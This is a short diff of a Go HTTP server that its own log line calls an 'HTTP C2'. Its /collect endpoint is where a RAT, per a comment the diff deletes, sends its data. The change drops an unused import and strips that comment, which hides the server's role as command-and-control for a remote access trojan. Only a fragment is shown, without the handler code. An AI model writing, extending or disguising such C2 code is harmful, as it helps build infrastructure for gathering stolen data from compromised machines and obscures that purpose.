@@ -1,7 +1,6 @@
 package main
 
 import (
-    "fmt"
     "io"
     "log"
     "net/http"
@@ -16,7 +15,7 @@ func main() {
     }
 
     http.HandleFunc("/", handleRoot)
-    http.HandleFunc("/collect", handleCollect) // RAT sends data here
+    http.HandleFunc("/collect", handleCollect)
 
     log.Println("HTTP C2 listening on :" + port)
     log.Fatal(http.ListenAndServe(":"+port, nil))
